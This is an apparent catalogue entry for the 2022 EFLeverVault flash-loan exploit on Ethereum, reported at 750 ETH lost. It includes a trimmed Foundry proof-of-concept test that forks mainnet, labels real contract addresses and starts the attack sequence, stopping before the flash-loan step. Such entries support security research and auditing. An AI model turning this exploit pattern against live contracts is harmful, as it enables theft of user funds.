# [?] EFLeverVault - Verify flashLoan Callback

## Summary
Severity: Unknown
Chain: Ethereum
Component: EFLeverVault
Published: 2022-10-14
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/EFLeverVault_exp.sol
Type: defi-exploit-poc

## Details
Lost: 750 ETH

```solidity
contract ContractTest is Test {
    IWETH constant WETH_TOKEN = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IEFLeverVault constant EFLEVER_VAULT = IEFLeverVault(0xe39fd820B58f83205Db1D9225f28105971c3D309);
    IBalancerVault constant BALANCER_VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    function setUp() public {
        vm.createSelectFork("mainnet", 15_746_199);
        // Adding labels to improve stack traces' readability
        vm.label(address(WETH_TOKEN), "WETH_TOKEN");
        vm.label(address(EFLEVER_VAULT), "EFLEVER_VAULT");
        vm.label(address(BALANCER_VAULT), "BALANCER_VAULT");
        vm.label(0xBAe7EC1BAaAe7d5801ad41691A2175Aa11bcba19, "EF_LEVER_TOKEN");
        vm.label(0x071108Ad85d7a766B41E0f5e5195537A8FC8E74D, "EF_LEVER_UNVERIFIED_SAFEMATH");
        vm.label(0x030bA81f1c18d280636F32af80b9AAd02Cf0854e, "aWETH_TOKEN");
        vm.label(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, "stETH_TOKEN");
        vm.label(0x1982b2F5814301d4e9a8b0201555376e62F82428, "aSTETH_TOKEN");
        vm.label(0xF63B34710400CAd3e044cFfDcAb00a0f32E33eCf, "variableDebtWETH_TOKEN");
        vm.label(0xA50ba011c48153De246E5192C8f9258A2ba79Ca9, "AAVE_ORACLE");
        vm.label(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9, "AAVE_LENDING_POOL_V2");
        vm.label(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, "CURVE_stETH_POOL");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker WETH balance before exploit", WETH_TOKEN.balanceOf(address(this)), 18
        );
        uint256 ethBalanceBefore = address(this).balance;

        // Deposit 0.1 ETH into the EFLever Vault
        EFLEVER_VAULT.deposit{value: 1e17}(1e17);

        emit log_named_decimal_uint(
            "\n\tBefore flashloan, ETH balance in EFLeverVault", address(EFLEVER_VAULT).balance, 18
        );
        // Flashloan to manipulate contract's balance
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/EFLeverVault_exp.sol_
